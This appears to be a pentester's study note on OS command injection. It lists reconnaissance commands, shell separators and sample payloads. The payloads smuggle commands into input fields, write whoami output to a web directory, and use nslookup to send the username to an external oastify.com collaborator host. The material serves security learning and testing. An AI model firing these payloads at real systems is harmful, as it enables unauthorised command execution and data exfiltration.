# Command Injection

## Userful Commands

| Purpose of command | Linux | Windows |
|--------------------|-------|---------|
| Name of current user | whoami | whoami |
| Operating system | uname -a | ver |
| Network configuration | ifconfig | ipconfig /all |
| Network connections | netstat -an | netstat -an |
| Running processes | ps -ef | tasklist |

## Command Separaters

| Separater | OS |
|-----------|----|
| `&` | Windows & Unix |
| `&&` | Windows & Unix |
| `\|` | Windows & Unix |
| `\|\|` | Windows & Unix |
| `;` | Unix |
| Newline (`0x0a` or `\n`) | Unix |
| ``` `whoami` ``` | Unix |
| `$(whoami)` | Unix |

## Testing

- Try echoing some thing `& echo aiwefwlguh &`
- Try triggering a time delay (good for blind command injections)`& ping -c 10 127.0.0.1 &` or `||ping+-c+10+127.0.0.1||`
- Try writing to accessible file locations `||whoami+>+/var/www/images/whoami.txt||` and using existing get requests to retrieve the file if required
- Try OAST with nslookup ``||nslookup+`whoami`.kxlxaeaaophnwecushvxqmz2ltrkfa3z.oastify.com||``